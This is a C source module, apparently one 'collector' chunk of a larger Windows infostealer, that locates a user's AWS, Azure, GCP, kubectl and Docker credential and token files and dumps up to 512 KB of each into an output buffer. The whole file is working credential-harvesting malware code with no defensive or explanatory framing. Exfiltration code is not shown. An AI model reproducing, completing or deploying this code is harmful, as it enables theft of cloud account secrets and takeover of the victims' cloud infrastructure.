// chunk: collectors/cloud_creds
// depends: core/emit_buffer, core/file_ops
// provides: collect_cloud_creds
// headers: shlobj.h

#ifndef CHUNK_CLOUD_CREDS
#define CHUNK_CLOUD_CREDS

#include <shlobj.h>

static void collect_cloud_creds(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    struct { const char *name; const char *rel; } cloud_files[] = {
        {"AWS credentials",      ".aws\\credentials"},
        {"AWS config",           ".aws\\config"},
        {"Azure profile",        ".azure\\azureProfile.json"},
        {"Azure tokens",         ".azure\\accessTokens.json"},
        {"GCP app creds",        "AppData\\Roaming\\gcloud\\application_default_credentials.json"},
        {"GCP properties",       "AppData\\Roaming\\gcloud\\properties"},
        {"kubectl config",       ".kube\\config"},
        {"Docker config",        ".docker\\config.json"},
    };

    int found = 0;
    for (int i = 0; i < (int)(sizeof(cloud_files)/sizeof(cloud_files[0])); i++) {
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", home, cloud_files[i].rel);
        if (file_exists(full)) {
            if (!found) emitf("=== CLOUD CREDENTIALS ===\r\n");
            found = 1;
            emitf("[%s]\r\n", cloud_files[i].name);
            emit_file(full, 512*1024);
            emitf("\r\n");
        }
    }
    if (found) emitf("\r\n");
}

#endif
